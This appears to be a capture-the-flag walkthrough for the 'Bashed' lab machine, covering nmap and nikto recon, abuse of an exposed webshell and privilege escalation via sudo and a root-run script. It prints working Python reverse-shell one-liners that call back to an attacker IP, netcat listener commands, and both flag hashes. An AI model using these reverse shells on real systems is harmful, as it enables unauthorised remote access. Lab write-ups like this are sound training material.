### IP
`10.10.10.68`

# Recon

### nmap
`nmap -sC -sV 10.10.10.68 -o Bashed.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 05:01 EST
Nmap scan report for 10.10.10.68
Host is up (0.051s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
```
* Looks like we only have port 80 with apache running

### nikto
`nikto -host 10.10.10.68`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.68
+ Target Hostname:    10.10.10.68
+ Target Port:        80
+ Start Time:         2020-11-23 05:06:21 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /php/: Directory indexing found.
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7864 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-11-23 05:20:10 (GMT-5) (829 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* the `/dev/` directory has a file that gives us a webshell

# Exploitation

* We can cd into `/home/arrexel` and `cat user.txt` to get the user flag: `2c281f318555dbc1b856957c7147bfc1`

### privesc

* FIRST:
* Let's upgrade the webshell to an interactive reverse shell:
* On the local terminal, write `nc -lvnp 1234` to listen for connections
* Enter the following command in the webshell:
	* Thanks to [this](https://w00troot.blogspot.com/2017/05/getting-reverse-shell-from-web-shell.html) blog
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Replace `10.10.14.12` with your vpn ip

* To upgrade the shell, put `python -c 'import pty;pty.spawn("/bin/bash");'` into the new shell
* Then, exit netcat with `CRTL-Z` and run `stty raw -echo` locally
* Now, reenter your session with `fg`
* Set your terminal emulator to xterm with `export TERM=xterm`
* Set your shell to bash with `export SHELL=bash`


* Running `sudo -l`, we get the following:
```
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
* Apparently we can already run sudo as scriptmanager without a password
* `ls -la /` also shows us that theres a `scripts` directory that only `scriptmanager` can access
	* we definitely want to switch to that user. We can do that by running `sudo -i -u scriptmanager`

* To connect back to the machine as root, let's change the python script to connect to a server
* On our local machine: `nc -lvnp 1235`
* On the reverse shell: `chmod 777 test.py` 
* On the reverse shell: `echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py`
	* Thanks to [this](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/cd15b05d-822f-494d-939a-ae5a671222ff.xhtml) page for the code

* Once we get a response on our local netcat, we can go through the same process as before to upgrade the shell.
* Now, we can cd into `/root/` and `cat root.txt` to get the root flag: `cc4f0afe3a1026d402ba10329674a8e2`